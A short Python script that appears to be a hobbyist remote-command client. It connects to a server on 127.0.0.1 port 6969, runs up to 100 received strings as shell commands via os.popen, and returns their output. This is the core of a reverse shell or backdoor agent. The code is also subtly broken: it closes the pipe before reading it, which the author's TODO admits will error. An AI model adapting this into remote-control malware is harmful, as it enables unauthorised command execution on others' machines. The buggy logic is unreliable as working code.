import socket
import os
 

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 6969
MAX_COMMANDS = 100
 

def recv_and_execute_command(client_socket):
    res = client_socket.recv(1024)
    res = res.decode("utf-8")
    print("Received command")
    output =  os.popen(res)
    # TODO This will cause an error when you try to read this fd:)
    if output.close() is None:
        sender = str(client_socket.getsockname()) + " sent back>> "
        client_socket.send(sender.encode("utf-8") + output.read().encode("utf-8"))
        print("command executed and sent to server")
    else:
        client_socket.send("Command not found".encode("utf-8"))
        print("Command not found")
 

def activate_client():
    client_socket = socket.socket()
    try:
        client_socket.connect((SERVER_ADDRESS, SERVER_PORT))
        print("Connected to the server")
    except:
        print("There was an error connecting to the server please try again")
    
    for _ in range(MAX_COMMANDS):
        recv_and_execute_command(client_socket)


if __name__ == "__main__":
    activate_client()